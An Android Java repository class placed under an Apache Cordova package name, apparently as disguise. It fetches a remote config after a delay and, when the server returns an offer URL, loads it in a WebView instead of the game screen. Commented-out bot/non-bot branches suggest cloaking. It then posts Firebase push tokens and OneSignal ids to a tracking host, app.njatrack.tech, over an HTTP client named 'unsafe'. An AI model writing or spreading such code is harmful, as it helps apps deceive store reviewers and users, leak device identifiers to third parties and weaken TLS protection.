package org.apache.cordova.repository.impl;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Handler;
import android.text.TextUtils;

import androidx.preference.PreferenceManager;

import com.google.gson.Gson;
import com.onesignal.OSDeviceState;
import com.onesignal.OneSignal;
import com.walhalla.ui.DLog;

import org.apache.cordova.Const;
import org.apache.cordova.http.HttpClient;
import org.apache.cordova.TPreferences;
import org.apache.cordova.ScreenType;
import org.apache.cordova.domen.Dataset;
import org.apache.cordova.repository.AbstractDatasetRepository;
import org.apache.cordova.domen.KwkResponseNew;
import org.apache.mvp.presenter.MainPresenter;
import org.jetbrains.annotations.NotNull;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.ResponseBody;
/**
 * Get URL From Server, with delay, with posttracker
 */
public class KwkRemoteRepositoryNew extends AbstractDatasetRepository
        implements Callback {

    private static final String __U__ = "https://app.njatrack.tech/technicalPostback/v1.0/";


    //Double Call
    //Request timeout

    private final String _URL_;
    private final Handler handler;

    public KwkRemoteRepositoryNew(Handler handler, String _URL_, Context context) {
        super(context);
        this._URL_ = _URL_;
        this.handler = handler;
    }

    @Override
    public void getConfig(Context context) {
        //Delayed Request
        Handler handler1 = new Handler();
        handler1.postDelayed(() -> {
            android.content.SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context.getApplicationContext());
            String url = MainPresenter.makeUrl(_URL_, preferences, context);
            DLog.d("@@" + url);
            OkHttpClient client = HttpClient.getUnsafeOkHttpClient0(context);
            Request request = new Request.Builder().url(url).build();
            Call call = client.newCall(request);
            call.enqueue(this);
        }, 1_000);
    }

    @Override
    public void onFailure(@NotNull Call call, @NotNull IOException e) {
        DLog.handleException(e);
        handler.post(() -> {
            callback.successResponse(new Dataset(ScreenType.GAME_VIEW, null));
            callback.handleError(e.getMessage());
        });
    }


    String json = "";

    @Override
    public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {

        ResponseBody body = response.body();
        json = "";
        if (body != null) {
            json = body.string();
        }
        handler.post(() -> {
//            if (Config.TAG_NOBOT.equals(var0)) {
//                makeScreen(new Dataset(WEB_VIEW, "https://google.com"));
//            } else if (Const.TAG_BOT.equals(var0)) {
//                makeScreen(new Dataset(ScreenType.GAME_VIEW, null));
//            } else {
//                makeScreen(new Dataset(ScreenType.GAME_VIEW, null));
//            }
            DLog.d("@: " + json);

            if (json.isEmpty()) {
                callback.successResponse(new Dataset(ScreenType.GAME_VIEW, null));
            } else {
                try {
                    Gson gson = new Gson();
                    KwkResponseNew entity = gson.fromJson(json, KwkResponseNew.class);
                    String offerUrl = entity.response;
                    final String client_id = entity.clientId;

                    //offerUrl = "https://google.com";
                    DLog.d("@id: " + client_id + ", " + offerUrl);

                    if (!TextUtils.isEmpty(client_id)) {
                        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context.getApplicationContext());
                        preferences.edit().putString(Const.key_pref_param_clid0, client_id).apply();

                    }
                    if (TextUtils.isEmpty(offerUrl)) {
                        callback.successResponse(new Dataset(ScreenType.GAME_VIEW, null));
                    } else {

                        //Before
                        Dataset aa = new Dataset(ScreenType.WEB_VIEW, offerUrl);
                        aa.enabled = true;
                        callback.successResponse(aa);

                        //Delayed Request
                        Handler handler1 = new Handler();
                        handler1.postDelayed(() -> {
                            partNumTwo(context, client_id);
                        }, 7_000);

                        //### Dataset aa = new Dataset(ScreenType.WEB_VIEW, offerUrl);
                        //### aa.setEnabled(true);
                        //### callback.successResponse(aa);
                    }

                } catch (Exception e) {
                    DLog.handleException(e);
                }
            }
        });
    }


    public static void partNumTwo(Context context, String client_id) {
        String firebase_push_token = TPreferences.getFirebaseToken(context);


        OSDeviceState mm = OneSignal.getDeviceState();
        String onesignal_player_id = "";//onesignal_player_id
        if (mm != null && mm.getUserId() != null) {
            onesignal_player_id = mm.getUserId();
        }

                        DLog.d("[OS = 2]" + onesignal_player_id);
//                        DLog.d("@@@@@@@@@@[ID 2]@@@" + client_id);
//                        DLog.d("@@@@@@@@@@[ID 3]@@@" + firebase_push_token);//empty

        RequestBody formBody = new FormBody.Builder()
                .add("onesignal_player_id", "" + onesignal_player_id)
                .add("client_id", "" + client_id)
                .add("firebase_push_token", "" + firebase_push_token)
                .build();

        OkHttpClient client = HttpClient.getUnsafeOkHttpClient0(context);
        String url = __U__
                + client_id
                + "?onesignal_player_id=" + onesignal_player_id
                + "&firebase_push_token=" + firebase_push_token
                ;
        //String url = __U__;

        Request request = new Request.Builder()
                .url(url)
                .post(formBody)
                .build();

        DLog.d("[URL_2]: " + url);

        Call call0 = client.newCall(request);
        call0.enqueue(new Callback() {
            @Override
            public void onFailure(@NotNull Call call, @NotNull IOException e) {
                DLog.handleException(e);
            }

            @Override
            public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {

                ResponseBody body = response.body();
                String json0 = "";
                if (body != null) {
                    json0 = body.string();
                    DLog.d("{@@@}" + json0);
                }
            }
        });
    }
}
